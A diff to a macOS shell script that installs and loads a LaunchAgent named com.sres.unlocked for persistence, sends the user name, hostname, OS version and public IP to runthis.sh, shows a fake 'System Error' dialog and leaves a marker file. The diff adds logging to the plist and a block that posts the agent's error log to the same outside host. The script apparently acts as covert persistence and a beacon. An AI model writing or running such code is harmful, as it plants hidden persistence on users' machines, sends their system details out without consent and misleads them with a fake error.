@@ -124,12 +124,23 @@ if [[ -f $HOME/.unlocked ]]; then
         <integer>21</integer>
       </dict>
     </array>
+    <key>StandardErrorPath</key>
+    <string>/tmp/com.sres.unlocked.err</string>
+    <key>StandardOutPath</key>
+    <string>/tmp/com.sres.unlocked.out</string>
   </dict>
 </plist>
 EOF
     launchctl load -w $HOME/Library/LaunchAgents/com.sres.unlocked.plist
 fi
  curl -X POST -s "https://runthis.sh/tattle?user=$(whoami)&host=$(hostname)&os=$(sw_vers -productVersion)&ip=$(curl -s ifconfig.me)"
+
+ # Read from  /tmp/com.sres.unlocked.err and post it to runthis.sh/error
+if [[ -f /tmp/com.sres.unlocked.err ]]; then
+    error=$(cat /tmp/com.sres.unlocked.err)
+    curl -X POST -s "https://runthis.sh/error?user=$(whoami)&host=$(hostname)&os=$(sw_vers -productVersion)&error=$error"
+fi
+
 osascript -e 'tell app "System Events" to display dialog "An unknown error occurred. Have you tried turning it off and on again?" with title "System Error"'
 
 touch $HOME/.unlocked
